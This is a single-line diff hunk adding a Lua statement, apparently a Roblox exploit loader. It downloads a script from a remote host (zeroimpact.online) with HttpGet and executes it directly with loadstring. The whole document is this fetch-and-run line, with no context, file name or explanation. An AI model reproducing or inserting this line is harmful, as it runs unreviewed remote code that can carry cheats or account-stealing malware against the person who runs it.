@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://www.zeroimpact.online/raw/loader"))()
